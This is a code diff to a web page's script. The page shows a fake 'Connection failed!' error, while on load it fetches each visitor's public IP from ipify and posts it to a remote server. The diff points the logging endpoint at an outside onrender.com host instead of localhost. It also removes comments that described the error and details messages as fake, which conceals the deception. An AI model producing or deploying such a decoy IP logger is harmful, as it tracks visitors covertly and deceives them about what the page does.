@@ -58,31 +58,27 @@
     </div>
 
     <script>
-        // گرفتن IP موقع ورود
         window.onload = function() {
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     let userIP = data.ip;
                     console.log("IP کاربر: " + userIP);
-                    sendIPToServer(userIP); // فرستادن به سرور
+                    sendIPToServer(userIP);
                 })
                 .catch(error => console.log("خطا: " + error));
         };
 
-        // تقلید ریلود
         function reloadPage() {
             alert("Connection failed! Please try again.");
         }
 
-        // نمایش جزئیات تقلبی
         function showDetails() {
             alert("No additional details available. Check your network.");
         }
 
-        // فرستادن IP به سرور
         function sendIPToServer(ip) {
-            fetch('http://localhost:5000/log-ip', {
+            fetch('https://water-fake-service.onrender.com/log-ip', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ ip: ip })
